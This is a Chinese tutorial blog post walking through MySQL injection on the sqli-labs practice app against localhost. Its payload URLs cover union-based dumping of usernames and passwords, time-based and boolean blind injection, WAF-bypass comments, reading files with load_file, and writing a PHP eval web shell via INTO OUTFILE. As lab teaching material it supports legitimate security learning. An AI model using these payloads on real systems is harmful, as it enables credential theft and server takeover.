---
title:      "关于Mysql注入(一)"
date:       2020-03-15 04:00:00
categories: 信息安全
excerpt_separator: <!--more-->
latex: true
tags:
    - sql_injection
---
## <center>基于sqli_lab的sql注入详解(一)</center>
<!--more-->

## mysql的目录结构
mysql 5.0以上的版本中，默认定义了$\color{red}{information}$_$\color{red}{schema}$数据库，其中包含有表$\color{red}{schemata}$(数据库名)、$\color{red}{tables}$(表名)、$\color{red}{columns}$(列名)

表名|含有重要列名
:-:|:-:
schemata|schema_name
tables|table_schema, table_name
columns|table_schema, table_name, column_name


***
## 基于报错的SQL注入

### 以less-1为例
![f1]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f1.png)   

### 这里提示输入ID作为参数值，那输入一下试试看

```http
http://127.0.0.1/sqli/Less-1/?id=1
```

### 返回结果1   
![f2]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f2.png)

### Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入

```http
http://127.0.0.1/sqli/Less-1/?id=1'
```

### 返回结果2
![f3]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f3.png)  

> **''1'' LIMIT 0,1'**   
> 观察报错语句，去掉最外层的引号，它是将从sql查询语句错误的地方开始用引号引起来，到语句结束处引号结束  
> 去掉引号之后，变为 **'1'' LIMIT 0,1**    
> 我们对ID的赋值为  **1'**  
> 所以可以猜到查询语句对ID的查询是单引号包起来   
> 这里可以看一下PHP源码  
> ![f4]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f4.png)   
> 可以看出ID确实是被单引号包裹起来的  

### 构造payload
1. 检测字段数  

   ```http
   http://127.0.0.1/sqli/Less-1/?id=1' order by 3 --+
   ```

   * order by 3 返回正确结果
   * order by 4 返回错误
   * 所以为3个字段  

   ![f5]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f5.png)  

2. 检测当前数据库的表名

   ```http
   http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,3 --+
   ```

    * 因为前面检测出了3个字段，所以Union select 1,2,3
    * $\color{red}{返回结果}$  
    ![f6]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f6.png) 
    * 可以看出数字2和3在页面显示出来了，所以选择在2或者3上注入

   ```http
   http://127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
   ```

   * 使用union select语句要注意$\color{red}{前面的条件不能成立，可赋id=-1}$
   * $\color{red}{返回结果}$
   ![f7]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f7.png)

3. 检测某一个表的列名

   ```http
   http://127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
   ```

   * 记得表名要加单引号包裹起来
   * $\color{red}{返回结果}$  
   ![f8]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f8.png)


4. 爆出整个表或某几个想要的列

   ```http
   http://127.0.0.1/sqli/Less-1/?id=-1' UNION ALL SELECT 1,group_concat(username,0x3a,password),3 from users --+
   ```

   * 0x3a表示引号，可以分开用户名和密码
   * $\color{red}{返回结果}$  
   ![f9]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f9.png)

***
## 关于mysql的注释
### 常见注释符
* #或--+或/**/ 

### 内联注释
* 在注释的开头处加上！便可执行mysql语句，只对mysql有效，常用来绕过WAF  
![f10]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f10.png)  
![f11]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f11.png)

***
## 基于时间的延时注入
### 以less-9为例
![f12]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f12.png) 

* 测试id参数发现不管是否加引号都会返回相同的结果，所以无法使用报错注入
* 这里可以看一下PHP源码  
![f14]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f14.png)  

### 利用if语句，若真则返回1，若假则延时3s
$\color{red}{真，时间为2s左右}$  
```http
http://127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(3)) --+
```
![f13]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f13.png)   
$\color{red}{假，时间为5s左右}$  
```http
http://127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=116,1,sleep(3)) --+
```
![f15]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f15.png)   

> * 注意payload要加and

***
## 布尔盲注
### 以less-8为例

```http
http://127.0.0.1/sqli/Less-8/?id=1'
```

* 加单引号发现错误界面  
![f16]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f16.png) 

### 利用返回的布尔值注入
#### 返回错误界面

```http
http://127.0.0.1/sqli/Less-8/?id=1' and length(database()) < 8 --+
```

#### 返回正确界面

```http
http://127.0.0.1/sqli/Less-8/?id=1' and length(database()) < 9 --+
```

#### 从而确定length(database())=8

***
## mysql读文件
### 前提
* 权限够高
* secure_file_priv不为NULL，需要通过my.ini修改
> ![f17]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f17.png)    
> $\color{red}{设置为空格即可}$    
> ![f18]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f18.png)  
> ![f19]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f19.png)

### 以less-1为例进行读文件

```http
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,load_file('F:\\flag.txt'),3 --+
```

![f20]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f20.png)

***
## mysql写文件
### 前提
* 权限够高
* 设置变量general_log为ON
> ![f21]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f21.png)

### 以less-7为例
#### 正确界面
![f22]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f22.png)

#### 反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面

```http
http://127.0.0.1/sqli/Less-7/?id=1')) --+
```

#### 可以写入一句话，然后使用蚁剑连接

```http
http://127.0.0.1/sqli/Less-7/?id=-1')) union select 1,2,'<?php eval($_POST["ezy"]);?>' into outfile "F:\\phpstudy_pro\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php" --+
```

![f23]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f23.png)

***
## mysql报错注入
### 以less-5为例
![f24]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f24.png)

### 利用 floor(),rand(),group by进行报错注入

```http
http://192.168.0.104/sqli/Less-5/?id=0' union select 1,2,count(*)  from information_schema.columns group by concat((select table_name from information_schema.tables where table_schema = database() limit 3,1),0x3a,floor(rand(0)*2)) --+
```

> * 注意只能返回一行数据，所以使用limit

#### 返回结果
![f25]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection_f25.png)

> * 通过改变payload爆出其他数据